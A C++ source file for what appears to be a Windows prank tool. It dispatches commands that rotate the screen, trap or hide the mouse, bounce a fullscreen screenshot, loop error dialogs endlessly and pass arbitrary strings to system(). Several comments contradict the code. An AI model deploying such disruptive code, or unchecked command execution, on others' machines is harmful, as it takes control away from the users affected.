// commands.cpp
#include "commands.hpp"
#include <SFML/Graphics.hpp>
#include <Windows.h>
#include <chrono>   // for sleep
#include <cstdlib>  // for commands (system() method)
#include <ctime>
#include <iostream>
#include <sstream>
#include <string>
#include <thread>
#include <vector>
#include <windows.h>

#ifndef DMDO_DEFAULT
    #define DMDO_DEFAULT 0  // Define as per the expected values
#endif

#ifndef DMDO_90
    #define DMDO_90 1
#endif

#ifndef DMDO_180
    #define DMDO_180 2
#endif

#ifndef DMDO_270
    #define DMDO_270 3
#endif

#ifndef DM_DISPLAYORIENTATION
    #define DM_DISPLAYORIENTATION 0x00000080  // This is the typical value for DM_DISPLAYORIENTATION
#endif

std::vector<std::string> static splitSentenceIntoWords(const std::string& sentence) {
    std::istringstream       iss(sentence);
    std::vector<std::string> words;

    std::string word;
    while (iss >> word)
    {
        words.push_back(word);
    }

    return words;  // array of type std::string
}

int getRand(int min, int max) { return (int) rand() % (max - min) + min; }

int randomBool() { return rand() % 2; }

int randomMinusOrPlus() { return (rand() % 2) * 2 - 1; }

namespace bilpakCommands {

void processCommand(const std::string& command) {
    // split the command into words
    std::vector<std::string> words =
      splitSentenceIntoWords(command);  // words[0] is the command itself and the rest are args
    std::string allArgs = command;
    allArgs.erase(0, words[0].length() + 1);
    if (command == "rotate_screen")
    {
        rotateScreen();
    }
    else if (command == "disable_mouse")
    {
        disableMouse();
    }
    else if (command == "enable_mouse")
    {
        enableMouse();
    }
    else if (command == "dvd")
    {
        dvd();
    }
    else if (words[0] == "runCommand")
    {
        runCommand(allArgs);
    }
    else if (words[0] == "change_console_color")
    {                          // New command to change color
        changeConsoleColor();  // Call the new function
    }
    else
    {
        std::cout << "Unknown command: " << command << std::endl;
    }
}

void rotateScreen() {
    DEVMODE dm;
    EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm);

    if (dm.dmDisplayOrientation == DMDO_DEFAULT)
    {
        dm.dmDisplayOrientation = DMDO_90;
    }
    else if (dm.dmDisplayOrientation == DMDO_90)
    {
        dm.dmDisplayOrientation = DMDO_180;
    }
    else if (dm.dmDisplayOrientation == DMDO_180)
    {
        dm.dmDisplayOrientation = DMDO_270;
    }
    else
    {
        dm.dmDisplayOrientation = DMDO_DEFAULT;
    }

    dm.dmFields = DM_DISPLAYORIENTATION;
    ChangeDisplaySettings(&dm, 0);
    std::cout << "Screen rotated." << std::endl;
}

void disableMouse() {
    RECT rect = {0, 0, 1, 1};
    ClipCursor(&rect);
    std::cout << "Mouse disabled." << std::endl;
}

void enableMouse() {
    ClipCursor(NULL);  // Re-enables mouse movement
    std::cout << "Mouse enabled." << std::endl;
}

void runCommand(const std::string& command) { system(command.c_str()); }

// Function to change the console background color
void changeConsoleColor() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    // Generate random colors for background (0-15 are valid color codes)
    int color = rand() % 16;

    // Set the console background color
    SetConsoleTextAttribute(hConsole,
                            color << 4);  // Background colors are the high 4 bits
    std::cout << "Console background color changed." << std::endl;
}

void invertColors() {
    HDC hdc = GetDC(NULL);
    BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0,
           NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
}

void trollMessageBox() {
    while (true)
    {
        MessageBox(NULL, "Just... Why?", "Trolled!", MB_OK | MB_ICONERROR);
    }
}

void hideMouseCursor() {
    // Hide the mouse cursor
    ShowCursor(FALSE);
    std::cout << "Mouse cursor hidden." << std::endl;

    // Sleep for 5 seconds before showing the cursor again
    std::this_thread::sleep_for(std::chrono::seconds(50));

    // Show the mouse cursor again
    ShowCursor(TRUE);
    std::cout << "Mouse cursor redappawdawdeared." << std::endl;
}

// Function to capture the screenshot
void captureScreenshot(sf::Texture& texture) {
    // Capture the screenshot
    HDC     hScreenDC = GetDC(nullptr);
    HDC     hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap   = CreateCompatibleBitmap(hScreenDC, 1920, 1080);
    SelectObject(hMemoryDC, hBitmap);

    // Bit block transfer into our compatible memory DC
    BitBlt(hMemoryDC, 0, 0, 1920, 1080, hScreenDC, 0, 0, SRCCOPY);

    // Get the bitmap data
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi;
    bi.biSize          = sizeof(BITMAPINFOHEADER);
    bi.biWidth         = bmp.bmWidth;
    bi.biHeight        = bmp.bmHeight;  // Height should be positive
    bi.biPlanes        = 1;
    bi.biBitCount      = 32;  // Use 32 bits for ARGB
    bi.biCompression   = BI_RGB;
    bi.biSizeImage     = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed       = 0;
    bi.biClrImportant  = 0;

    sizeof(hBitmap);

    // Create buffer for pixel data
    std::vector<sf::Uint8> pixels(bmp.bmWidthBytes * bmp.bmHeight);
    GetDIBits(hMemoryDC, hBitmap, 0, bmp.bmHeight, pixels.data(), (BITMAPINFO*) &bi,
              DIB_RGB_COLORS);

    // Create SFML image from the pixel data
    sf::Image screenshotImage;
    screenshotImage.create(bmp.bmWidth, bmp.bmHeight, pixels.data());

    // Flip the image vertically and rearrange color channels
    std::vector<sf::Uint8> flippedPixels(bmp.bmWidth * bmp.bmHeight * 4);
    for (int y = 0; y < bmp.bmHeight; ++y)
    {
        for (int x = 0; x < bmp.bmWidth; ++x)
        {
            // Get the index for the original pixel (BGRA)
            int originalIndex = (y * bmp.bmWidth + x) * 4;
            // Get the index for the flipped pixel (RGBA)
            int flippedIndex = ((bmp.bmHeight - 1 - y) * bmp.bmWidth + x) * 4;

            // Rearrange colors from BGRA to RGBA
            flippedPixels[flippedIndex]     = pixels[originalIndex + 2];  // R
            flippedPixels[flippedIndex + 1] = pixels[originalIndex + 1];  // G
            flippedPixels[flippedIndex + 2] = pixels[originalIndex];      // B
            flippedPixels[flippedIndex + 3] = pixels[originalIndex + 3];  // A
        }
    }

    // Load the flipped image into the texture
    texture.loadFromImage(screenshotImage);  // Load the original image
    texture.update(flippedPixels.data());    // Update texture with flipped pixel data
    texture.setSmooth(true);                 // Optional: enable smoothing

    // Cleanup
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
}

int dvd() {
    // Seed the random number generator
    srand(static_cast<unsigned int>(time(nullptr)));

    // Capture the screenshot once (add a delay to ensure it captures correctly)
    sf::Texture screenshotTexture;
    captureScreenshot(screenshotTexture);

    // Add a slight delay to ensure the screenshot is ready
    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    // Get the desktop resolution
    RECT desktop;
    GetWindowRect(GetDesktopWindow(), &desktop);
    int screenWidth  = desktop.right;
    int screenHeight = desktop.bottom;

    // Create the SFML window in fullscreen mode with VSync enabled
    auto window = sf::RenderWindow(sf::VideoMode(screenWidth, screenHeight), "CMake SFML Project",
                                   sf::Style::Fullscreen);
    window.setVerticalSyncEnabled(true);  // Enable VSync
    window.setFramerateLimit(144);        // Optional: limit frame rate to 144 FPS

    // Hide the mouse cursor
    window.setMouseCursorVisible(false);

    // Ensure the window is focused and always on top
    HWND hwnd = window.getSystemHandle();
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    SetForegroundWindow(hwnd);

    // Create a sprite for the screenshot and scale it up
    sf::Sprite screenshotSprite(screenshotTexture);
    screenshotSprite.setScale(0.25f, 0.25f);  // Scale up to 15%

    // Initialize position and movement direction
    sf::Vector2f position(getRand(0.f, 100.f), getRand(0.f, 100.f));  // Starting position
    sf::Vector2f velocity(5.f * randomMinusOrPlus(),
                          5.f * randomMinusOrPlus());  // Movement direction
    screenshotSprite.setPosition(position);            // Set the initial position of the sprite

    // Main loop
    while (window.isOpen())
    {
        for (auto event = sf::Event(); window.pollEvent(event);)
        {
            if (event.type == sf::Event::Closed)
            {
                window.close();
            }
        }

        // Update position
        position += velocity;
        screenshotSprite.setPosition(position);

        // Check for collision with the window edges and bounce
        if (position.x <= 0 || position.x + screenshotSprite.getGlobalBounds().width >= screenWidth)
        {
            velocity.x = -velocity.x;  // Reverse x direction
        }
        if (position.y <= 0
            || position.y + screenshotSprite.getGlobalBounds().height >= screenHeight)
        {
            velocity.y = -velocity.y;  // Reverse y direction
        }

        // Clear the window
        window.clear();

        // Draw the screenshot sprite
        window.draw(screenshotSprite);

        // Display the contents of the window
        window.display();
    }

    return 0;
}
HBITMAP captureScreen(int width, int height) {
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Define a BITMAPINFO for a 32-bit DIB
    BITMAPINFO bi              = {};
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = width;
    bi.bmiHeader.biHeight      = -height;  // Negative height for top-down DIB
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;  // 32-bit color (ARGB)
    bi.bmiHeader.biCompression = BI_RGB;

    // Create a DIB section and select it into the memory DC
    void*   pBits;
    HBITMAP hBitmap = CreateDIBSection(hMemoryDC, &bi, DIB_RGB_COLORS, &pBits, NULL, 0);
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen to the memory DC
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // Cleanup
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);

    return hBitmap;
}

void applyColorMultiply(HBITMAP hBitmap, COLORREF color) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // Access the pixel data
    BITMAPINFO bi           = {};
    bi.bmiHeader.biSize     = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth    = bmp.bmWidth;
    bi.bmiHeader.biHeight   = bmp.bmHeight;
    bi.bmiHeader.biPlanes   = 1;
    bi.bmiHeader.biBitCount = 32;  // ARGB

    HDC     hMemoryDC = CreateCompatibleDC(NULL);
    void*   pBits;
    HBITMAP hTempBitmap = CreateDIBSection(hMemoryDC, &bi, DIB_RGB_COLORS, &pBits, NULL, 0);
    SelectObject(hMemoryDC, hTempBitmap);

    // Copy bitmap data to a temporary bitmap to manipulate pixels
    BitBlt(hMemoryDC, 0, 0, bmp.bmWidth, bmp.bmHeight, GetDC(NULL), 0, 0, SRCCOPY);

    // Get the RGB components from the COLORREF
    BYTE rMultiplier = GetRValue(color);
    BYTE gMultiplier = GetGValue(color);
    BYTE bMultiplier = GetBValue(color);

    // Modify pixel data
    BYTE* pixels = static_cast<BYTE*>(pBits);
    for (int y = 0; y < bmp.bmHeight; ++y)
    {
        for (int x = 0; x < bmp.bmWidth; ++x)
        {
            // Calculate pixel index (BGRA format)
            int index         = (y * bmp.bmWidth + x) * 4;
            pixels[index]     = static_cast<BYTE>(pixels[index] * bMultiplier / 255);      // Blue
            pixels[index + 1] = static_cast<BYTE>(pixels[index + 1] * gMultiplier / 255);  // Green
            pixels[index + 2] = static_cast<BYTE>(pixels[index + 2] * rMultiplier / 255);  // Red
        }
    }

    // Copy modified pixels back to the original bitmap
    HDC hOriginalDC = GetDC(NULL);
    SelectObject(hOriginalDC, hBitmap);
    BitBlt(hOriginalDC, 0, 0, bmp.bmWidth, bmp.bmHeight, hMemoryDC, 0, 0, SRCCOPY);

    // Cleanup
    DeleteObject(hTempBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hOriginalDC);
}

int flashColors() {
    // Seed the random number generator
    srand(static_cast<unsigned int>(time(nullptr)));

    // Get screen dimensions
    RECT desktop;
    GetWindowRect(GetDesktopWindow(), &desktop);
    int screenWidth  = desktop.right;
    int screenHeight = desktop.bottom;

    // Capture the entire screen once
    HBITMAP screenshotBitmap = captureScreen(screenWidth, screenHeight);

    // Main loop
    while (true)
    {
        // Generate a random color
        COLORREF randomColor = RGB(rand() % 256, rand() % 256, rand() % 256);

        // Apply color multiplication
        applyColorMultiply(screenshotBitmap, randomColor);

        // Small delay (for example, every 2 seconds)
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    DeleteObject(screenshotBitmap);
    return 0;
}
}  // namespace bilpakCommands
